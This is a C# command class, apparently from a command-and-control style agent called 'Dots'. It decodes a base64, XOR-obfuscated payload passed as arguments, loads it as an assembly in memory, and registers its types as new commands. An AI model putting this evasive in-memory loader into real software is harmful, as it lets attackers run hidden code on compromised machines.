using System;
using System.Reflection;
using Dots.Models;

namespace Dots.Commands
{
    public class LoadCommand : DotsCommand
    {
        public override string Name => "load";
        public override DotsProperties DotsProperty { get; set; }

        public override string Execute(string[] args)
        {           
            Assembly assembly = Assembly.Load(Zor(Convert.FromBase64String(args[0]), args[1]));

            foreach (Type type in assembly.GetExportedTypes())
            {
                object command = Activator.CreateInstance(type);
                DotsProperty.Commands.Add(command);
            }
            return $"Succesfully loaded {assembly.FullName} module.";
        }
    }
}
